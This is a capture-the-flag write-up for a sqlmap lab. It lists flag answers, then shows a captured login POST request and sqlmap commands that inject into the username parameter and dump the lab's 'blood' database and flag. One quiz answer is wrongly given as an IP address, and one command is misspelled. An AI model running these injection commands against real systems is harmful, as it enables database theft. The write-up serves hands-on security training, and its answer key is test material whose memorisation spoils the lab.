# SQLMAP

### Using Sqlmap
- Which flag or option will allow you to add a URL to the command? `-u`
- Which flag would you use to add data to a POST request? `--data`
- There are two parameters: username and password. How would you tell sqlmap to use the username parameter for the attack? `-p username`
- Which flag would you use to show the advanced help menu? `-hh`
- Which flag allows you to retrieve everything? `-a`
- Which flag allows you to select the database name? `-D`
- Which flag would you use to retrieve database tables? `--tables`
- Which flag allows you to retrieve a table’s columns? `--columns`
- Which flag allows you to dump all the database table entries? `--dump-all`
- Which flag will give you an interactive SQL Shell prompt? `--sql-shell`
- You know the current db type is 'MYSQL'. Which flag allows you to enumerate only MySQL databases? `10.10.151.124`

### SQLMap Challenge
- What is the name of the interesting directory? `blood`
- Who is the current db user? <br />
I capture a post request with burpsuite and put it inside a `request` file:

      POST /blood/auth.php HTTP/1.1
      Host: 10.10.151.124
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate, br
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 27
      Origin: http://10.10.151.124
      Connection: keep-alive
      Referer: http://10.10.151.124/blood/login.php
      Cookie: PHPSESSID=97ni5og1n4i87igklqoh43bcs0
      Upgrade-Insecure-Requests: 1
      Priority: u=0, i

      username=test&password=test
Now run `qlmap -r request -p username --risk 3 --level 5 --batch --dbms=mysql --current-user` to get the answer: `root`
- What is the final flag? <br />
I run `sqlmap -r request -p username --risk 3 --level 5 --batch --dbs`. <br />
![image](https://github.com/user-attachments/assets/40f82a59-3648-4fb9-a9f4-0414055f47d9)<br />
Then I run `sqlmap -r request -p username --risk 3 --level 5 --batch --dbms=mysql -D blood --tables`:<br />
![image](https://github.com/user-attachments/assets/d0e1b2e3-9a36-4eaa-ac75-0fd582102d16)<br />
Finally, I run `sqlmap -r request -p username --risk 3 --level 5 --batch --dbms=mysql -D blood -T flag --dump-all`:<br />
![image](https://github.com/user-attachments/assets/d20b7e8b-b683-4d9c-8b86-a05fecd84923)<br />
`thm{sqlm@p_is_L0ve}`
